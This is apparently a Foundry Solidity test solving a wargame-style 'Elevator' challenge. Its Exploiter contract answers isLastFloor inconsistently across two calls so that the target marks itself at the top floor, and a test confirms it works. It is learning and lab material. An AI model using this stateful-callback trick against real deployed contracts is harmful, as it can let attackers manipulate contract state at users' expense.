// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Elevator, Building} from "../src/Elevator.sol";

contract Exploiter is Building {
    Elevator private victim;
    bool private firstCall;

    constructor(Elevator _victim) {
        victim = _victim;
        firstCall = true;
    }

    function goTo(uint256 floor) public {
        victim.goTo(floor);
    }

    function isLastFloor(uint256) external override returns (bool) {
        // if the Elevator call us the first time return `false` to trick him
        // but return `true` if the second time to exploit it
        if (firstCall) {
            firstCall = false;
            return false;
        } else {
            return true;
        }
    }
}

contract ElevatorTest is Test {
    Elevator public ev;
    Exploiter public et;

    address alice = address(1);

    function setUp() public {
        ev = new Elevator();
        et = new Exploiter(ev);
    }

    function testAttack() public {
        assertEq(ev.top(), false);

        et.goTo(1);

        assertEq(ev.top(), true);
    }
}
